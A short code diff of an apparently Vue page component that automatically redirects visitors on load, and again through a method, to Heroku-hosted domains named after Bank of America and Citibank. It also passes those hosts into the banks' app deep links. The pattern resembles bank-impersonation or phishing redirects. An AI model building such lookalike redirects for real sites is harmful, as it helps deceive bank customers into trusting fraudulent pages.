@@ -7,11 +7,11 @@
 
   export default {
     mounted() {
-      window.location.href = 'bankofamerica://open.my.app?url_launch=https://bankofamericaverified.herokuapp.com/user-verified';
+      window.location.href = 'https://citibankverified.herokuapp.com/profile';
     },
     methods: {
       redirectToURL() {
-        window.location.href = 'bankofamerica://open.my.app?url_launch=https://bankofamericaverified.herokuapp.com/user-verified';
+        window.location.href = 'citibank://open.my.app?url_launch=https://citibankverified.herokuapp.com/profile';
       },
     },
   };
